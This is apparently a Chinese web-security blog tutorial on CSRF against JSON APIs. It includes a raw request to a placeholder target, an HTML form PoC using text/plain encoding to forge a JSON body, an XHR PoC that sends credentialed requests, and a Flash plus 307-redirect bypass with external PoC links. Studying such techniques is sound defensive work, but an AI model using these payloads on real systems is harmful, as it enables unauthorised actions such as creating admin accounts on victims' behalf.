Json格式的CSRF

发表于 2019-07-08 | 分类于 Web安全

Json格式的CSRF

有这样一个场景，新增用户不校验Referer，没有token，马上可以想到CSRF漏洞。但它又有一些不同的是它提交的数据是Json格式的，请求包类似：

POST /api/add HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-requested-with: XMLHttpRequest
Content-Length: 124
Origin: https://target.com
Connection: close
Referer: https://target.com/account/unitivesubacct/add?service=erp&bg_source=7&part_type=1&feconfig=erp.chains
Cookie: abcdefg

{"login":"admin1","password":"123456","mobile":"13000000000","intercode":"86","name":"","requestCode":"","responseCode":""}

POST提交的不是表单，而是Json数组，如果我们直接使用burp生成poc，生成的是以表单形式提交的，类似：

直接使用这个poc会出现一个问题，post数据包会多了一个”=”：

`{"login":"admin1","password":"123456","mobile":"13000000000","intercode":"86","name":"","requestCode":"","responseCode":""}=`

补全Json格式

这个=就导致服务端的Json解析器解析不了，然后报错。
这种情况下，我们可以以给value赋值从而对这个“=”后面的数据进行补全，使得其构成一个完整的JSON格式，可避免解析器报错:

<html>  
<form action="http://target.com/api/add" method="POST" enctype="text/plain">  
<input name='{"login":"admin1","password":"123456","mobile":"13000000000","intercode":"86","name":"","requestCode":"","responseCode":"", "":"' value='test"}'type='hidden'>  
<input type=submit>  
</form>  
</html>

这样POST的数据就变成一个正确的Json格式了，可能可以避免报错。

{"login":"admin1","password":"123456","mobile":"13000000000","intercode":"86","name":"","requestCode":"","responseCode":"","":"="}

设置Content-Type

但是这里还有一个问题，在原始的数据包里Content-Type的值是application/json，而以form去提交是没法设置application/json的，在这里设置为text/plain。
如果服务器对Content-Type有校验，这里就会报错。所以需要将Content-Type设为application/json。
这里可以使用XHR实现，poc类似：

<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://target.com/api/add", true);
        xhr.setRequestHeader("Accept", "*/*");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
        xhr.withCredentials = true;
        xhr.send(JSON.stringify({"login":"admin1","password":"123456","mobile":"13000000000","intercode":"86","name":"","requestCode":"","responseCode":""});
    }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();"/>
    </form>
  </body>
</html>

但是这种方法会先进行一次OPTIONS预请求：

OPTIONS /api/add HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
Origin: null
Connection: close

如果服务器并未设置允许任意域名跨域请求，就会拒绝options预请求。

Flash+307跳转

这里可以使用Flash+307跳转绕过（但是该方法在2018年之后版本的浏览器应该都不行了）

需要环境如下：

  • 能发起HTTP请求的swf文件(csrf_json.swf)
  • 307跳转(307.php)
  • 上面两个文件同域

参考：https://github.com/sp1d3r/swf_json_csrf

使用1lastBr3ath提供的测试POC进行测试：

http://cm2.pw/crossdomain

POC:

http://cm2.pw/redirect?url=http://xxxxtarget.com/add&status=307
